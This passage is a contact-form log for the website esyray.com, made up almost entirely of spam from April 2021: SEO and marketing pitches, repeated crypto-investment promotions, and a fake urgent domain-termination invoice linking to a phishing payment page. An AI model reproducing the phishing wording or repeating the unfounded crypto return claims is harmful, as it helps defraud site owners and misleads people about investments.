CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-04-09 01:49:54 PM -- Email from: Olivia Johnson, -- subject: Hidden Secrets of Money - A Documentary That Will change Your Life, -- email: pilar.beich@hotmail.com, -- Message is: The Federal Reserve has been stimulating and stimulating the economy by printing more USD. Do you really understand how the monetary system works and how it affects you?

We are in extra-ordinary times and extraordinary times call for extraordinary measures. How do you ensure you stay on the right side of the upcoming wealth transfer from all the currency printing by central banks around the world?

Before you make any decision, we highly recommend you invest some of your time to watch and learn from this short series of documentary (designed for the average guy on the street) in youtube.

This is a video series called &quot;Hidden Secrets of Money&quot;
https://bit.ly/3sOxlQJ

This document will explain why it is important you own some physical gold, silver and bitcoin.

I have personally watched the entire series 3 times and it has changed the way I look at the entire monetary system. Protect your family by owning some physical gold, silver and bitcoin.

Buy bitcoin here and save 10% from your trading fees at the world's biggest crypto exchange:
https://bit.ly/31uRnnb

If you are a US resident, you can buy bitcoin here:
https://bit.ly/3r3oPvQ
+++ 2021-04-09 07:37:30 PM -- Email from: Francis Jamieson, -- subject: Voice search, -- email: francis.jamieson@alexabusinessdirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://alexabusinessdirectory.link/abcc1/?=esyray.com


 

 
Francis















 
2764 Pleasant Road Suite        Suite A PMB 708        Fort Mill        SC        29708

You can skip future marketing messages here:
https://alexabusinessdirectory.link/out.php?site=esyray.com
+++ 2021-04-10 05:18:45 AM -- Email from: Denny Ruiz, -- subject: , -- email: denny.ruiz@googlemail.com, -- Message is: How would you like to promote your website for free? Have a look at this: http://bit.ly/sites-that-accept-free-ads
+++ 2021-04-10 07:11:54 PM -- Email from: Shantae Scarfe, -- subject: Windows &amp; Mac Software For Sale – Special Low Prices, -- email: sales1@wexx99.com, -- Message is: Dear Sirs We have the license keys for the following Windows &amp; MacOS software for sale. Software for Windows:  Windows 10 – Home Edition $39/Save $50 * Scrapebox for Windows with Premium Plug-in YellowPages Scraper $79/Save $55 * Scrapebox for Windows $57/Save $40 * Axandra Internet Business Promoter $199/Save $100 * GSA E-mail Spider $39/Save $30 * GSA E-mail Verifier $39/Save $30 * GSA Search Engine Ranker $59/Save $40 * GSA SEO Indexer $29/Save $30 * Management-Ware E-mail Finder $59/Save $40 * IOLO System Mechanic Pro $39/ Save $30 **** Software for MacOS: MaxBulk Mailer Pro v8 $39/Save $20 * Wondeshare Filmora 9 $29/Save $30 * Parallels Desktop 16 $39/Save $30 * iSkysoft iMedia Converter DeLuxe $39/Save $30* Transmit 5 $29/ Save $20 * Techtool Pro 8 Full Version $39/Save $50 All license keys are available for immediate delivery via e-mail upon your payment. We will be delighted to hear from you. Have a great day. Best regards Brian WRIGHT Eng., WEXX 99 Business Solutions, sales@wexx99.com, https://wexx99.com
+++ 2021-04-11 01:35:12 PM -- Email from: Gus Bosley, -- subject: Pay attention to your website, -- email: bosley.gus@gmail.com, -- Message is: Finally, a comprehensive Website Speed – Up service where you can sit back and let us do everything for you. We'll make your website so fast that your visitors will say &quot;WOW!&quot;.
https://your-seo-technicians.com/speedup
Regards,

P.S. We offer the best marketing services on our website, still not interested? Here is an easy, 1-click unsubscribe link: https://your-seo-technicians.com/?unsubscribe=esyray.com
+++ 2021-04-11 03:12:09 PM -- Email from: Hershel Segura, -- subject: Explore Buddhism -  A Way Of Life For Your Inner Peace, -- email: segura.hershel93@msn.com, -- Message is: Dear you,

Times are bad and many are suffering. This is a time when many are seeking solace and inner peace. While we cannot change much of what is going on around us, we can calibrate our inner self.

I personally found Buddhism (a way of life) to be really beneficial.

Do take some time off to explore Buddhism in the short videos below (including a Mantra that really sooths our soul).


Buddhism As a Way of Life - From Dough
https://www.youtube.com/watch?v=pbngKOUgCDY

My Path To Becoming A Buddhist - From Emma Slade
https://www.youtube.com/watch?v=QnJIjEAE41w

If you are curious about the &quot;Mantra Of Great Compassion&quot; as mentioned in the videos above, you can listen to it here and calm your soul.
https://www.youtube.com/watch?v=72luMobA_vI



Buddhism is more of a way of life than a religion. It doesnt matter what your background is, we believe everyone can incorporate Buddhism into one's daily life.

How To Practice Buddhism for Beginners and Westerners (Daily Practice) by Alan Peto
https://www.youtube.com/watch?v=89gM2g0KOYU

If you find this helpful and knows someone in need of this, please do share this.
+++ 2021-04-12 08:06:29 AM -- Email from: Mike Keat, -- subject: Local SEO for more business, -- email: no-replysnumb@gmail.com, -- Message is: Howdy 
 
I have just took a look on your SEO for  esyray.com for its Local SEO ranks and seen that your website could use a push. 
 
We will enhance your Local Ranks organically and safely, using only whitehat methods, while providing Google maps and website offsite work at the same time. 
 
Please check our pricelist here, we offer SEO at cheap rates. 
https://speed-seo.net/product/local-seo-package/ 
 
Start improving your local visibility with us, today! 
 
regards 
Mike Keat
 
Speed SEO Digital Agency 
support@speed-seo.net
+++ 2021-04-12 02:40:26 PM -- Email from: Victoria Myers, -- subject: The right video for you, -- email: victoria@customvideo.link, -- Message is: Hi, I recently visited your web site and wanted to send you a quick note - we work with small businesses like yours to publish a custom make promotional video, featuring your company online.
 
To help you learn more, we made a quick video which you can watch here: https://www.customvideo.link/success/?=esyray.com
 
Also, after you watch the video we’ll send you a free marketing report for your company – you can request this at our website https://www.customvideo.link/success/?=esyray.com
 
Thanks and have a great day!
Victoria






- This commercial message sent from PJLK Marketing LC
410 East Santa Clara Street Suite 824 
San Jose, CA 95113

To unsubscribe click here:
https://customvideo.link/out.php/?site=esyray.com
+++ 2021-04-12 05:59:43 PM -- Email from: , -- subject: , -- email: team@bark.com, -- Message is: Hi,

Cliff has just asked us to help them find a quality Electrician in Plano, Texas.

We’re now contacting local professionals on their behalf, and if you respond quickly there’s a strong chance you’ll secure the business. It’s free to do so, and there’s no obligation to continue using our service in future.

A maximum of 5 professionals can contact Cliff, so be quick!

Take a look at Cliff’s request below and, if you can help, click the following link to contact them directly.

Contact Cliff now: https://www.bark.com/find-work/united-states/plano-texas/electricians/15e18bc8/p38704998/
                   
Client details:

Cliff
Electricians - Plano, Texas
Cliff has made their phone number available. We will make it available to you when you send your first message.

Project details:

What kind of work do you need doing?: Re-wiring

What type of property is this for?: House

What needs rewiring?: Multiple rooms

When do you want the work done?: As soon as possible




Reply now: https://www.bark.com/find-work/united-states/plano-texas/electricians/15e18bc8/p38704998/

What is Bark?
Bark is a lead generation service. Customers tell us what they’re looking for and we put them in touch with great companies like yours to help get the job done.

Join today and you’ll be able to contact your first customer on us. After that, there’s no commission, no monthly fee – and everything you make with us is yours to keep.

We’ll send you information about new customers for free, and you can simply pick and choose the ones that work best for you.

Why have we contacted you?
We believe your company can help Cliff with their project, and we’d like to put you two in touch.

They’ve asked us to find a great local Electrician, and if you respond right away there’s a strong chance you’ll secure the business.

Contact Cliff now: https://www.bark.com/find-work/united-states/plano-texas/electricians/15e18bc8/p38704998/

If you’d like any help with this, please call (424) 227-5323 (open 24 hours a day, 7 days a week) or email team@bark.com and we'll be happy to assist.

Many thanks, 
Andrew Good

If you don't want to hear from us again when new customers are looking for services in your area click here: https://www.bark.com/en/us/p-unsubscribe/LDnp29/Mw763X/?x=1
+++ 2021-04-12 10:02:40 PM -- Email from: Paul NinjaPromo, -- subject: SMM, -- email: ninjapromo.paul@gmail.com, -- Message is: Hi!

I hope that I'm not bothering you. My name is Paul, I'm a business development manager at Social Media Marketing agency NinjaPromo.io. I'm reaching you in case you're looking for a SMM team.

You'll get 5 people at your disposal who'll work on creating, distributing and promoting content. We'll tell and show everything about you in a best way to attract new audience and involve existing community even more.

To prove my words, feel free to check the results of previous campaigns:
https://ninjapromo.io/our-cases

If you are interested, book a call here https://calendly.com/ninjapromo
Email: ninjapromo.paul@gmail.com
+++ 2021-04-13 06:32:52 AM -- Email from: Josefina Pullman, -- subject: Verified facebook reviews, inside for esyray.com, -- email: josefina.pullman@gmail.com, -- Message is: Hey,
I'm ,
How are you doing regarding your Facebook Page Reviews?
Facebook page reviews convert more customers. Customer is much more likely to buy should they find themselves on the site. So, advertising your Facebook page rating on your own facebij business page or maps will usually seal the offer.
Check what we are capable of doing for you: 
https://one-two-seo.com/facebook-page-reviews
Regards,

P.S. We offer the best marketing services on our website, still not interested? Here is an easy, 1-click unsubscribe link https://one-two-seo.com/?unsubscribe=esyray.com
+++ 2021-04-13 02:35:32 PM -- Email from: Linwood Huston, -- subject: 100 Backlinks to esyray.com in 30 Days, -- email: huston.linwood@gmail.com, -- Message is: Hi,

We're just stopping by to offer you our free guide titled, &quot;100 Backlinks in 30 Days&quot;.

By building your first 100 links, you’ll not only drastically increase your site’s authority - you’ll prime it to rank for tons of keywords.

Please take a look here: https://backlinks100.com

This is a one-off contact, so we won't bother you again.

Kind Regards,
Linwood
+++ 2021-04-14 10:22:23 AM -- Email from: Francis Jamieson, -- subject: Voice search, -- email: francis.jamieson@alexabusinessdirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://alexabusinessdirectory.link/abcc1/?=esyray.com


 

 
Francis















 
2764 Pleasant Road Suite        Suite A PMB 708        Fort Mill        SC        29708

You can skip future marketing messages here:
https://alexabusinessdirectory.link/out.php?site=esyray.com
+++ 2021-04-15 04:02:00 AM -- Email from: Dustin Campos, -- subject: Explore Buddhism -  A Way Of Life For Your Inner Peace, -- email: dustin.campos73@gmail.com, -- Message is: Dear you,

Times are bad and many are suffering. This is a time when many are seeking solace and inner peace. While we cannot change much of what is going on around us, we can calibrate our inner self.

I personally found Buddhism (a way of life) to be really beneficial.

Do take some time off to explore Buddhism in the short videos below (including a Mantra that really sooths our soul).


Buddhism As a Way of Life - From Dough
https://www.youtube.com/watch?v=pbngKOUgCDY

My Path To Becoming A Buddhist - From Emma Slade
https://www.youtube.com/watch?v=QnJIjEAE41w

If you are curious about the &quot;Mantra Of Great Compassion&quot; as mentioned in the videos above, you can listen to it here and calm your soul.
https://www.youtube.com/watch?v=72luMobA_vI



Buddhism is more of a way of life than a religion. It doesnt matter what your background is, we believe everyone can incorporate Buddhism into one's daily life.

How To Practice Buddhism for Beginners and Westerners (Daily Practice) by Alan Peto
https://www.youtube.com/watch?v=89gM2g0KOYU

If you find this helpful and knows someone in need of this, please do share this.
+++ 2021-04-15 01:35:25 PM -- Email from: Eric Jones, -- subject: Cool website!, -- email: eric.jones.z.mail@gmail.com, -- Message is: Cool website!

My name’s Eric, and I just found your site - esyray.com - while surfing the net. You showed up at the top of the search results, so I checked you out. Looks like what you’re doing is pretty cool.
 
But if you don’t mind me asking – after someone like me stumbles across esyray.com, what usually happens?

Is your site generating leads for your business? 
 
I’m guessing some, but I also bet you’d like more… studies show that 7 out 10 who land on a site wind up leaving without a trace.

Not good.

Here’s a thought – what if there was an easy way for every visitor to “raise their hand” to get a phone call from you INSTANTLY… the second they hit your site and said, “call me now.”

You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Time is money when it comes to connecting with leads – the difference between contacting someone within 5 minutes versus 30 minutes later can be huge – like 100 times better!

That’s why we built out our new SMS Text With Lead feature… because once you’ve captured the visitor’s phone number, you can automatically start a text message (SMS) conversation.
  
Think about the possibilities – even if you don’t close a deal then and there, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Wouldn’t that be cool?

CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!
Eric

PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-04-15 02:01:38 PM -- Email from: Shella Pound, -- subject: Re:Hi! - Website Submitter©, -- email: pound.shella@gmail.com, -- Message is: Hi people at esyray.com,
Hope you’re well. 
I'm ,
Hope you’re good, and that the company is profitable. Please allow me to introduce to you this service.
Minimize the time and costs to market your website with our Artificial Intelligence Website Submitter.
https://genius-seo.com
Regards,

P.S. We offer the best marketing services on our website, still not interested? Here is an easy, 1-click unsubscribe link: https://genius-seo.com/?unsubscribe=esyray.com
+++ 2021-04-16 12:01:16 PM -- Email from: Verlene Schofield, -- subject: Explore Buddhism -  A Way Of Life For Your Inner Peace, -- email: schofield.verlene65@yahoo.com, -- Message is: Dear you,

Times are bad and many are suffering. This is a time when many are seeking solace and inner peace. While we cannot change much of what is going on around us, we can calibrate our inner self.

I personally found Buddhism (a way of life) to be really beneficial.

Do take some time off to explore Buddhism in the short videos below (including a Mantra that really sooths our soul).


Buddhism As a Way of Life - From Dough
https://www.youtube.com/watch?v=pbngKOUgCDY

My Path To Becoming A Buddhist - From Emma Slade
https://www.youtube.com/watch?v=QnJIjEAE41w

If you are curious about the &quot;Mantra Of Great Compassion&quot; as mentioned in the videos above, you can listen to it here and calm your soul.
https://www.youtube.com/watch?v=72luMobA_vI



Buddhism is more of a way of life than a religion. It doesnt matter what your background is, we believe everyone can incorporate Buddhism into one's daily life.

How To Practice Buddhism for Beginners and Westerners (Daily Practice) by Alan Peto
https://www.youtube.com/watch?v=89gM2g0KOYU

If you find this helpful and knows someone in need of this, please do share this.
+++ 2021-04-16 04:33:20 PM -- Email from: Rachel Florent, -- subject: surprising, -- email: rachel.florent@videomarketingnow.xyz, -- Message is: Hey, 

You have a lot going on right now, but maybe we can help?

We make professional videos for businesses to put on their websites.

See examples of what we can do for you:
https://www.videomarketingnow.xyz/success/?=esyray.com

These videos are helping businesses GROW right now, at a time when they need it most.

Rachel Florent
Custom Video Specialist





410 Santa Clara St. East, Unit 817	
San Jose,	CA 95113
 
No more video marketing:
https://videomarketingnow.xyz/out.php/?site=esyray.com
+++ 2021-04-16 06:31:15 PM -- Email from: Esperanza Wilburn, -- subject: Ahrefs DR Boost with 40% Discount, -- email: wilburn.esperanza@gmail.com, -- Message is: Hello

Get an amazing DR50+ for your esyray.com and dominate the SERPs
https://www.speed-seo.net/product/ahrefs-dr60/

40% Discount Coupon:   AHREFS


thank you
Peter Wilburn
Speed SEO Agency
support@speed-seo.net
+++ 2021-04-17 01:27:59 AM -- Email from: Linda Miller, -- subject: Secrets To Mastering Internet Lead Conversion?, -- email: lindamillerleads@gmail.com, -- Message is: Hi esyray.com Owner,

Do you want to know the Secrets To Mastering Internet Lead Conversion?

I spent the last 10+ years generating, calling and closing Internet leads. I will be sharing my decade long conversion code for you to copy during this new, free webinar!
During the webinar, I will show you:

Every business needs to capture more leads, create more appointments, and close more deals.

If you commit to mastering the content in this session, you will earn more money immediately– not in six months or a year, but literally as soon as you put your new knowledge to work. I have used this method on 1,000's of Internet leads of all price points. 

If you want Internet leads, I have the key to CONVERTING them. Hope you can make it... https://TalkWithWebTraffic.com/Webinar

If getting more Hot Phone Leads is a part of your business plan (and why wouldn't it be?), I've got great news for you.

1. 12 ways to generate seller leads
2. How to get seller leads on the phone
3. What to say on the phone so you get instant sales
4. The Key to SMS Marketing
5  Never Cold Call Again
6. Better leads = Faster conversions
7. The four keys to inside sales success
8. The 10 steps to a perfect sales call with an Internet lead

More than 7,000 people have already registered. The last time I did a webinar with Top Producers, hundreds of people got locked out and could only watch the replay. Get your spot now and tune in early!

==&gt; Save my spot https://TalkWithWebTraffic.com/Webinar

We've become obsessed with making sure our clients are converting the leads we generate for them. 

How much are you getting back in commissions compared to how much are you spending on advertising? But what is even better than a great ROI is a quick ROI. During this live webinar I will show you how we can help you generate higher quality leads that are easier to convert, fast.

==&gt;  Register at https://TalkWithWebTraffic.com/Webinar

Your #1 Fan, 
Linda Miller
Be there or be square.

If you'd like to unsubscribe click here http://talkwithwebtraffic.com/unsubscribe.aspx?d=esyray.com
+++ 2021-04-17 06:54:08 PM -- Email from: Benjamin Ehinger, -- subject: Website Content Writing Team, -- email: writingbyb@gmail.com, -- Message is: Hi! 
 
Do you struggle to find time to write articles? 
 
Hire the best team of writers online today! 
 
We do all the research and provide well-written, unique SEO content perfect for higher search engine ranking and better visitor engagement. 
 
If you need fresh articles for your blog, check out our current content rates here: 
 
https://writingbybenjamin.com/best-seo-articles/
+++ 2021-04-17 07:08:54 PM -- Email from: Joe Newman, -- subject: trying to connect, -- email: joey+newman4@myblogposters.com, -- Message is: Hello,

My name is Joey from MyBlogPosters.com.

I am reaching out to let you know that I am giving away 26 professional level blog post templates (worth $297) for your site. You can use them to drammatically speed up creating user engaging content for esyray.com, in any niche you like.

If this is of interest to you, please visit https://myblogposters.com/ where you can grab your 26 free blog post templates now. 

Thanks for your time. 

With best regards
Joey Newman

joey@myblogposters.com

Article Artist  at https://myblogposters.com/

If this is not of interest please accept my apologies and opt out here https://unsubscribe.onlineserver1.com/mbp?d=esyray.com
+++ 2021-04-18 11:03:57 PM -- Email from: Sterling Rich, -- subject: 3 interesting youtube videos to change your life, -- email: rich.sterling@gmail.com, -- Message is: Is Bitcoing going to one million dollars or zero? Check out the video below:
https://www.youtube.com/watch?v=c6DmQxBlXms


Bitcoin Infiltrates Corporate America
https://www.youtube.com/watch?v=Cg10yYZjK94

The Feds are Creating a Liquidity Tsunami - Robert Kiyosaki, Kim Kiyosaki and Richard Duncan
https://www.youtube.com/watch?v=lJCm6MW6nok

Inflation is going to eat away your savings, buy some bitcoins to preserve your purchasing power (and potentially even make money from it)
Buy bitcoin here and save 10% from your trading fees at the world's biggest crypto exchange:
https://bit.ly/31uRnnb

If you are a US resident, you can buy bitcoin here:
https://bit.ly/3r3oPvQ
+++ 2021-04-18 11:24:54 PM -- Email from: Lyda Sissons, -- subject: Contact Us - You must stop receiving spam, -- email: lyda.sissons60@googlemail.com, -- Message is: Good morning people at esyray.com,
Hope you’re good. 
I'm , I hope that clients are profitable and you’ve been successful through the entire current situation.
I assume you will want to have a better blocker form unwanted emails, you may need that one.
https://the-web-marketing.com/captcha
Kind regards,

P.S. We offer the best marketing services on our website, still not interested? Here is an easy, 1-click unsubscribe link: https://the-web-marketing.com/?unsubscribe=esyray.com
+++ 2021-04-20 12:08:58 AM -- Email from: Ash, -- subject: , -- email: ash@techknowspace.com, -- Message is: Hello,

My Name is Ash and I Run Tech Know Space https://techknowspace.com We are your Premium GO-TO Service Centre for All Logic Board &amp; Mainboard Repair

When other shops say &quot;it can't be fixed&quot; WE CAN HELP!

ALL iPHONE 8 &amp; NEWER
BACK GLASS REPAIR - 1 HOUR

Devices We Repair
Audio Devices Audio Device Repair

Bluetooth Speakers - Headphones - iPod Touch
Computers All Computer Repair

All Brands &amp; Models - Custom Built - PC &amp; Mac
Game Consoles Game Console Repair

PS4 - XBox One - Nintendo Switch
Laptops All Laptop Repair

All Brands &amp; Models - Acer, Asus, Compaq, Dell, HP, Lenovo, Toshiba
MacBooks All MacBook Repair

All Series &amp; Models - Air, Classic, Pro
Phones All Phone Repair

All Brands &amp; Models - BlackBerry, Huawei, iPhone, LG, OnePlus, Samsung, Sony
Smart Watches Apple Watch Repair

Apple Watch - Samsung Gear - Moto 360
Tablets All Tablet Repair

All Brands &amp; Models - iPad, Lenovo Yoga, Microsoft Surface, Samsung Tab

Drone Repair

Call us and tell us your issues today!

Toll Free: (888) 938-8893
https://techknowspace.com

Ash Mansukhani
ash@techknowspace.com
&lt;img src=&quot;https://yt3.ggpht.com/ytc/AAUvwnhUhkYdWNeEvgk0Kb1HPFRGjLlXdAKaAXUhwNjC=s900-c-k-c0x00ffffff-no-rj&quot; alt=&quot;Ash Mansukhani&quot; width=&quot;500&quot; height=&quot;600&quot;&gt;
+++ 2021-04-20 03:48:35 PM -- Email from: Beth Collins, -- subject: Error on your website, -- email: collins282@yahoo.com, -- Message is: It looks like this link is broken on your site: https://www.esyray.com/lettersfromretirees.html

I thought you would like to know :).  Silly mistakes can ruin your site's credibility.  I've used a tool called linkSniff.com in the past to keep mistakes off of my website.

-Beth
+++ 2021-04-21 03:11:02 PM -- Email from: Mike Molligan, -- subject: affordable monthly SEO plans, -- email: no-reply@google.com, -- Message is: Howdy 
 
I have just analyzed  esyray.com for its SEO Trend and saw that your website could use an upgrade. 
 
We will increase your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our pricelist here, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start increasing your sales and leads with us, today! 
 
regards 
Mike Molligan
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2021-04-21 06:40:44 PM -- Email from: Kara Ericson, -- subject: 3 interesting youtube videos to change your life, -- email: kara.ericson@yahoo.com, -- Message is: Is Bitcoing going to one million dollars or zero? Check out the video below:
https://www.youtube.com/watch?v=c6DmQxBlXms


Bitcoin Infiltrates Corporate America
https://www.youtube.com/watch?v=Cg10yYZjK94

The Feds are Creating a Liquidity Tsunami - Robert Kiyosaki, Kim Kiyosaki and Richard Duncan
https://www.youtube.com/watch?v=lJCm6MW6nok

Inflation is going to eat away your savings, buy some bitcoins to preserve your purchasing power (and potentially even make money from it)
Buy bitcoin here and save 10% from your trading fees at the world's biggest crypto exchange:
https://bit.ly/31uRnnb

If you are a US resident, you can buy bitcoin here:
https://bit.ly/3r3oPvQ
+++ 2021-04-22 07:18:02 PM -- Email from: Emelia Zepps, -- subject: 3 interesting youtube videos to change your life, -- email: emelia.zepps18@googlemail.com, -- Message is: Is Bitcoing going to one million dollars or zero? Check out the video below:
https://www.youtube.com/watch?v=c6DmQxBlXms


Bitcoin Infiltrates Corporate America
https://www.youtube.com/watch?v=Cg10yYZjK94

The Feds are Creating a Liquidity Tsunami - Robert Kiyosaki, Kim Kiyosaki and Richard Duncan
https://www.youtube.com/watch?v=lJCm6MW6nok

Inflation is going to eat away your savings, buy some bitcoins to preserve your purchasing power (and potentially even make money from it)
Buy bitcoin here and save 10% from your trading fees at the world's biggest crypto exchange:
https://bit.ly/31uRnnb

If you are a US resident, you can buy bitcoin here:
https://bit.ly/3r3oPvQ
+++ 2021-04-23 03:56:33 AM -- Email from: Ashley McNeel, -- subject: Important Reminder, -- email: ashely@thevoicedirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
http://thevoicedirectory.link/abcc1/?=esyray.com


Ashley
Voice Activation Follow-up Specialist
The Voice Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://thevoicedirectory.link/out.php?site=esyray.com
+++ 2021-04-23 10:07:57 AM -- Email from: Alexander Boll, -- subject: Get more Instagram followers, -- email: alexander466alan@gmail.com, -- Message is: Looking for Facebook likes or Instagram followers? 
We can help you. Please visit https://1000-likes.com/ to place your order.
+++ 2021-04-23 06:18:40 PM -- Email from: Megan O'Connell, -- subject: For your site, -- email: megan@gomarketing.link, -- Message is: Greetings, after seeing your website I wanted to let you know that we work with businesses like yours to publish a custom marketing &amp; promotional video, featuring your business online.
 
The short video below shows you what this custom made video can do for your business:
 
Visit the website below to learn more:
https://www.gomarketing.link/success/?=esyray.com
 
Also, we will send you a free marketing report for your company – simply visit https://www.gomarketing.link/success/?=esyray.com

Thanks!
Megan
Go Marketing Co.






- This commercial message sent from PJLK Marketing LC
410 East Santa Clara Street Suite 824 
San Jose, CA 95113

To unsubscribe click here:
https://gomarketing.link/out.php/?site=esyray.com
+++ 2021-04-24 09:05:58 PM -- Email from: Den, -- subject: ATTENTION, -- email: info@hostdomains.com, -- Message is: TERMINATION OF DOMAIN esyray.com
Invoice#: 481353
Date: 2021-04-25

IMMEDIATE ATTENTION REGARDING YOUR DOMAIN esyray.com IS ABSOLUTLY NECESSARY

TERMINATION OF YOUR DOMAIN esyray.com WILL BE COMPLETED WITHIN 24 HOURS

Your payment for the renewal of your domain esyray.com has not received yet

We have tried to reach you by phone several times, to inform you regarding the TERMINATION of your domain esyray.com

CLICK HERE FOR SECURE ONLINE PAYMENT: https://checkoutdomainsite.ga/?n=esyray.com&amp;r=a&amp;t=1619298315&amp;p=v12

IF WE DO NOT RECEIVE YOUR PAYMENT WITHIN 24 HOURS, YOUR DOMAIN esyray.com WILL BE TERMINATED!

CLICK HERE FOR SECURE ONLINE PAYMENT: https://checkoutdomainsite.ga/?n=esyray.com&amp;r=a&amp;t=1619298315&amp;p=v12

YOUR IMMEDIATE ATTENTION IS ABSOLUTELY NECESSARY IN ORDER TO KEEP YOUR DOMAIN esyray.com

The submission notification esyray.com will EXPIRE WITHIN 24 HOURS after reception of this email
+++ 2021-04-26 02:21:18 PM -- Email from: Dakota Luxton, -- subject: Forget about Bitcoin. Buy this instead., -- email: luxton.dakota4@hotmail.com, -- Message is: While the mainsteam media is talking &quot;Bitcoin Bitcoin Bitcoin&quot;, it is not a good idea to buy bitcoin now.

Reason? It has gone up quite a lot and has lesser room to grow.

If you are going to take high risk with your money in cryptocurrency, it is reasonable to expect high returns.

How high?

We believe this coin Kin can potentially give you a x10 or even x100 from the currenct price.

Yes, Im talking about a 10 or even potentially 100 bagger here.

A $100 can be turned into a $1000 or $10,000.

A $10,000 invested in Kin might even nett you a MILLION DOLLARS!

Kin coin (https://kin.org/) is also currenctly not listed on Binance (the world's biggest cryptocurrency exchange and Coinbase (recently listed in NASDAQ).

Coins which list of each of the exchanges have been known to go up in prices and Kin is a coin that has such high potential.

For more details on WHY Kin has such potential, we suggest you invest the next 15 mins of your time reading this:

https://medium.com/@ghosttype01/why-kin-will-be-a-100b-network-7fce59a08cfe

To buy Kin, you can sign up for a free account here at FTX and get 5% off your trading fees!
Click here for details: https://bit.ly/3nkbLSa
+++ 2021-04-27 01:24:45 AM -- Email from: Natasha Schey, -- subject: 14.000 Unique Visitors for esyray.com, have arrived!, -- email: schey.natasha@yahoo.com, -- Message is: Good Afternoon
We develop data-driven digital marketing strategies that achieve success. Let us boost your business social media presence. We can't wait to help you.
Here is our offer to you:
https://ultimate-marketers.com/socialnetworks
Kind regards,

P.S. We offer the top marketing services you may find on our online shop, still not interested in getting new customers? Here is a straightforward, 1-click unsubscribe link: https://ultimate-marketers.com/?unsubscribe=esyray.com
+++ 2021-04-28 03:25:10 AM -- Email from: Hi Nice site https://google.com, -- subject: Hi Nice site https://google.com, -- email: ascehine@mail.ru, -- Message is: Hi Nice site https://google.com
+++ 2021-04-29 08:22:42 AM -- Email from: DavidSAG, -- subject: The first cryptocurrency advertising network on the market, -- email: grosswendt.millane@web.de, -- Message is: Pay for a fraction of targeted traffic and useful actions. 
Get more paying customers. 
3 advertising models: CPD, CPA and CPM 
We respect the privacy of netizens 
Payment with various cryptocurrencies 
https://www.google.com/url?q=https%3A%2F%2Fgfdgdfashrhr.blogspot.com%2F2021%2F04%2Fgrhfgjhgdgdhdhdrhgsrdhe.html&amp;sa=D&amp;Fp=Jq&amp;usg=AFQjCNGjhUC6Je8M44wiXQF0KG8tObandA
+++ 2021-04-29 11:47:16 AM -- Email from: Damian Sladen, -- subject: Forget about Bitcoin. Buy this instead., -- email: sladen.damian@gmail.com, -- Message is: While the mainsteam media is talking &quot;Bitcoin Bitcoin Bitcoin&quot;, it is not a good idea to buy bitcoin now.

Reason? It has gone up quite a lot and has lesser room to grow.

If you are going to take high risk with your money in cryptocurrency, it is reasonable to expect high returns.

How high?

We believe this coin Kin can potentially give you a x10 or even x100 from the currenct price.

Yes, Im talking about a 10 or even potentially 100 bagger here.

A $100 can be turned into a $1000 or $10,000.

A $10,000 invested in Kin might even nett you a MILLION DOLLARS!

Kin coin (https://kin.org/) is also currenctly not listed on Binance (the world's biggest cryptocurrency exchange and Coinbase (recently listed in NASDAQ).

Coins which list of each of the exchanges have been known to go up in prices and Kin is a coin that has such high potential.

For more details on WHY Kin has such potential, we suggest you invest the next 15 mins of your time reading this:

https://medium.com/@ghosttype01/why-kin-will-be-a-100b-network-7fce59a08cfe

To buy Kin, you can sign up for a free account here at FTX and get 5% off your trading fees!
Click here for details: https://bit.ly/3nkbLSa
+++ 2021-04-29 07:42:22 PM -- Email from: Jay McDonald, -- subject: Can you point me in the right direction for esyray.com?, -- email: jayson+m2@mysalesscripter.com, -- Message is: Dear Sir/Madam,

I'm sorry to trouble you. Would you be so kind as to  inform me who is responsible for copy writing and content creation for esyray.com  as well as  exactly how I might  contact?

